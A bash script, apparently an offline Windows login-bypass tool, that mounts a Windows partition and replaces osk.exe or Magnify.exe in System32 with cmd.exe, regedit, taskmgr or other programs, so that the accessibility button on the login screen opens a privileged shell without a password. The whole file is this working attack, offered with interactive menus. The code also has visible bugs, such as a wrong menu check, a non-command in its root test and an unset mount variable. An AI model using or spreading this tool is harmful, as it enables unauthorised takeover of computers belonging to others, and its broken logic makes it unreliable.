#!/bin/bash

MYDIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null && pwd )"
MKPATCH=1

usage()
{
    echo "$0 <path to where windows is mounted>"
    echo "if no mountpoint is provided, script will try to parse mountpoint as /dev/sda4"
}

patchlist() {
    clear
    echo "Patch for $1.exe "
    echo "Patch with : "
    echo " 1 : cmd "
    echo " 2 : Netplwiz"
    echo " 3 : Calculator (calc)"
    echo " 4 : Display Switch (DisplaySwitch)"
    echo " 5 : Device Info (msinfo32)"
    echo " 6 : notepad "
    echo " 7 : Task Manager (taskmgr)"
    echo " 8 : regedit "
    echo " 9 : Wordpad "
    read -p " Make your choice : " patch 
        if [[ $patch = 1 ]]; then 
            patcher $1 cmd 
        elif [[ $patch = 2 ]]; then 
            patcher $1 Netplwiz 
        elif [[ $patch = 3 ]]; then 
            patcher $1 calc 
        elif [[ $patch = 4 ]]; then 
            patcher $1 DisplaySwitch 
        elif [[ $patch = 5 ]]; then 
            patcher $1 msinfo32 
        elif [[ $patch = 6 ]]; then 
            patcher $1 ../notepad 
        elif [[ $patch = 7 ]]; then 
            patcher $1 taskmgr 
        elif [[ $patch = 8 ]]; then 
            patcher $1 ../regedit 
        elif [[ $patch = 7 ]]; then 
            patcher $1 ../write 
        else 
            echo "Unknown option."
            exit 
        fi        
}

patcher() {
    echo Patching..
    cd drive/Windows/System32
    cp -fpr $1.exe $1.exe.bak 
    cp -fpr $2.exe $1.exe 
    echo "Patch done !"
}

if [[ $(whoami | grep root) ]]; then 
    : 
else 
    echo "Are we root? "
    exiting. 
fi 

if [[ $1 = "-h" ]]; then 
    usage 
    exit 
fi 

if [[ ! -n $1 ]]; then 
    MOUNTP=/dev/sda4
fi 
mkdir drive
sudo mount $MOUNTP drive   
if [[ $(ls drive/Windows/System32 | grep cmd.exe) ]]; then 
    :
else
    echo "System32 not found. Are you at the right directory?"
    exit 
fi 
echo "============================================================================="
echo " ______     __  __     ______     ______     ______     ______     ______    "  
echo "/\  ___\   /\ \/\ \   /\  == \   /\___  \   /\  ___\   /\  == \   /\  __ \   "  
echo "\ \___  \  \ \ \_\ \  \ \  __<   \/_/  /__  \ \  __\   \ \  __<   \ \ \/\ \  "
echo " \/\_____\  \ \_____\  \ \_____\   /\_____\  \ \_____\  \ \_\ \_\  \ \_____\ "
echo "  \/_____/   \/_____/   \/_____/   \/_____/   \/_____/   \/_/ /_/   \/_____/ "
echo "============================================================================="
echo "            Release R2 . What does it need to be human? @Elation232          "
echo "============================================================================="
echo ""
echo ""
echo ""
echo ""
echo "============================================================================="
echo "=                               Patch menu                                  ="
echo "= (1) Patch On Screen Keyboard (osk.exe)                                    ="
echo "= (2) Patch Magnifyer (magnify.exe)                                         ="
echo "= (3) View credits                                                          ="
echo "= (0) Reboot                                                                ="
echo "============================================================================="
read -p "Make your choice : " choice 

if [[ $choice = 1 ]]; then 
    patchlist osk 
elif [[ $choice = 2 ]]; then 
    patchlist Magnify 
elif [[ $choice = 3 ]]; then
    echo "jam boiiiiii"
elif [[ $choice = 0 ]]; then 
    reboot 
else 
    echo "unknown option bruh"
    exit 
fi
